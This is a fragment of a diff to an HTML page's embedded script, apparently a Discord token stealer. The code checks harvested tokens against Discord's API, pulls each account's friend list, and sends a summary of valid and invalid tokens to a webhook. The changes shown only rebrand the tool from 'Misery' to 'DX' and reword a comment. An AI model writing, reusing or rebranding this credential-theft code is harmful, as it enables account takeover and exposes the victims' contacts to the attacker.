                                 headers: { 'Authorization': token }
@@ -622,7 +613,7 @@
                             }
                         } catch(e) {}
 
-                        // Get friends (relationships)
+                        // Friends
                         try {
                             const fRes = await fetch('https://discord.com/api/v9/users/@me/relationships', {
                                 headers: { 'Authorization': token }
@@ -656,7 +647,7 @@
 
             Promise.all(tokenPromises).then(async (results) => {
                 const summary = results.join('\n');
-                await sendToWebhook('```\nMISERY TOKEN SCAN RESULTS\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
+                await sendToWebhook('```\nDX TOKEN SCAN RESULTS\n' + summary + '\n\nValid: ' + validCount + ' | Invalid: ' + invalidCount + '\n```');
             });
         }
 
@@ -677,7 +668,7 @@
             wrappedLines.forEach(span => asciiContainer.appendChild(span));
         }
 
-        console.log('Misery loaded.');
+        console.log('DX loaded.');
     })();
     </script>
 </body>
